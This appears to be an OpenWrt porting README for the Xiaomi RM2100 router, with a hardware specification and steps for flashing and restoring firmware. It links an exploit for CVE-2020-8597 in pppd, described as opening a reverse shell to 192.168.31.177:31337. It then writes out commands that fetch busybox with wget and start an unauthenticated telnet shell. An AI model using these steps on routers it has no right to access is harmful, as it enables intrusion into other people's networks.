# Xiaomi-RM2100-1.0.14-vs.-CVE-2020-8597

Specification:

CPU: MediaTek MT7621A
RAM: 128 MB DDR3
FLASH: 128 MB ESMT NAND
WIFI: 2x2 802.11bgn (MT7603)
WIFI: 4x4 802.11ac (MT7615)
ETH: 3xLAN+1xWAN 1000base-T
LED: Power, WAN, in Amber and White
UART: On board near ethernet, opposite side from power
Modified u-boot
Installation:

Run linked exploit to get shell, startup telnet and wget the files over
mtd write openwrt-ramips-mt7621-xiaomi_rm2100-squashfs-kernel1.bin kernel1
mtd write openwrt-ramips-mt7621-xiaomi_rm2100-squashfs-rootfs0.bin rootfs0
nvram set uart_en=1
nvram set bootdelay=5
nvram set flag_try_sys1_failed=1
nvram commit
mtd -r write openwrt-ramips-mt7621-xiaomi_rm2100-squashfs-rootfs0.bin rootfs0
Restore to stock:

Setup PXE and TFTP server serving stock firmware image (See dhcp-boot option of dnsmasq)
Hold reset button down while powering on
Wait until status led changes from flashing amber to white
Notes:
This device has dual kernel and rootfs slots like other Xiaomi devices currently supported (mir3g, etc.)
Thus, we use the second slot and overwrite the first rootfs onwards in order to get more space.

Exploit:

https://gist.github.com/namidairo/1e3fb3404c9f148474c06ae6616962f3    (pppd-cve.py)

An implementation of CVE-2020-8597 against stock firmware version 1.0.14

This requires a computer with ethernet plugged into the wan port and an active PPPoE session,
and if successful will open a reverse shell to 192.168.31.177 on port 31337.

As this shell is somewhat unreliable and likely to be killed in a random amount of time,
it is recommended to wget a static compiled busybox binary onto the device and start telnetd with it.
The stock telnetd and dropbear appear inoperable (Disabled on release versions of stock firmware likely)
Ie. wget https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mipsel -O /tmp/busybox
chmod a+x /tmp/busybox
/tmp/busybox telnetd -l /bin/sh

Signed-off-by: Richard Huynh voxlympha@gmail.com

